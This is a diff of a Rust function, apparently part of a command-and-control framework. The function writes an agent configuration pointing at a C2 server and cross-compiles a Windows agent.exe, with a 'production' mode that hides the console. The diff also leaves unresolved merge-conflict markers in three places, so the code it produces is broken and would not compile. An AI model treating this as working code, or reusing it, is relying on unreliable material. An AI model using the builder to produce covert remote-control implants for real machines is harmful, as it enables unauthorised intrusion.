@@ -75,7 +75,7 @@ pub fn generate_agent(
     c2_server: &str,
     production: bool,
 ) -> Result<(), Box<dyn std::error::Error>> {
-    println!("🔧 Generando configuración del agente...");
+    println!(" Generando configuración del agente...");
 
     // Check if source code is available
     let (workspace_root, agent_relative_path) = match find_workspace_with_source() {
@@ -189,6 +189,7 @@ pub fn generate_agent(
         c2_server
     )?;
 
+<<<<<<< HEAD
     println!("✅ Configuración escrita en {}", config_file_path.display());
     println!("🌐 Servidor C2 configurado: {}", c2_server);
 
@@ -203,15 +204,24 @@ pub fn generate_agent(
         "-p",
         "agent",
     ];
+=======
+    println!(" Configuración escrita en {}", config_file_path);
+    println!(" Servidor C2 configurado: {}", c2_server);
+
+    // Compilar el agente con features apropiadas
+    println!(" Compilando agente para Windows...");
+
+    let mut cargo_args = vec!["build", "--release", "--target", "x86_64-pc-windows-gnu", "-p", "agent"];
+>>>>>>> c91d9a7f4ae0e377b6e588ce3dd50af442df4b6f
 
     // Agregar flags de feature según el modo
     if production {
-        println!("🔒 Modo PRODUCCIÓN: sin consola, sin debug prints");
+        println!(" Modo PRODUCCIÓN: sin consola, sin debug prints");
         cargo_args.push("--no-default-features");
         cargo_args.push("--features");
         cargo_args.push("production");
     } else {
-        println!("🐛 Modo DESARROLLO: con consola y debug prints");
+        println!(" Modo DESARROLLO: con consola y debug prints");
         // dev is default, no need to specify
     }
 
@@ -221,22 +231,36 @@ pub fn generate_agent(
         .output()?;
 
     if output.status.success() {
+<<<<<<< HEAD
         println!("✅ Compilación exitosa!");
         let exe_path = workspace_root.join("target/x86_64-pc-windows-gnu/release/agent.exe");
         println!("🏃 Ejecutable generado en {}", exe_path.display());
+=======
+        println!(" Compilación exitosa!");
+        let exe_path = format!(
+            "{}/target/x86_64-pc-windows-gnu/release/agent.exe",
+            workspace_root
+        );
+        println!(" Ejecutable generado en {}", exe_path);
+>>>>>>> c91d9a7f4ae0e377b6e588ce3dd50af442df4b6f
 
         // Copiar ejecutable
         let dest_path = format!("{}.exe", output_name);
         if std::fs::copy(&exe_path, &dest_path).is_ok() {
-            println!("📦 Ejecutable copiado como: {}", dest_path);
+            println!(" Ejecutable copiado como: {}", dest_path);
         } else {
             println!(
+<<<<<<< HEAD
                 "⚠️  No se pudo copiar el ejecutable, está en: {}",
                 exe_path.display()
+=======
+                "  No se pudo copiar el ejecutable, está en: {}",
+                exe_path
+>>>>>>> c91d9a7f4ae0e377b6e588ce3dd50af442df4b6f
             );
         }
     } else {
-        println!("❌ Error durante la compilación:");
+        println!(" Error durante la compilación:");
         println!("STDERR: {}", String::from_utf8_lossy(&output.stderr));
         println!("STDOUT: {}", String::from_utf8_lossy(&output.stdout));
         return Err("Compilación fallida".into());
